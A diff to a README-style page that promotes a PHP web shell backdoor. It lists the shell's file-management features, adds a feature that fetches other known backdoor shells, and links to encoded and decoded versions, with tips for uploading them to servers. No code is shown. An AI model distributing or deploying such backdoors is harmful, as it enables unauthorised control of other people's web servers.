@@ -4,6 +4,7 @@
 
 In this shell backdoor, several useful features are also available to carry out activities that are usually required, namely:</b>
 
+- Get Shell Backdoor (IndoXploit, WSO, B374K, Evil Twin, MARIJUANA, 1n73ction, ALFA Tesla V4, NoName)
 - Upload
 - Edit
 - Rename
@@ -24,6 +25,6 @@ Download : <a href="https://github.com/cowokumel/s3nd4ljepit-minishell/">https:/
 Enc Version : <a href="https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-enc.php">https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-enc.php</a>
 Dec Version : <a href="https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-dec.php">https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-dec.php</a>
 
-Note: actually both are the same, but there are some servers that display an error if using the <i>enc version</i>.
+Note:</b> actually both are the same, but there are some servers that display an error if using the <i>enc version</i>.
 To solve this, try uploading the <i>dec version</i>.
 </pre>
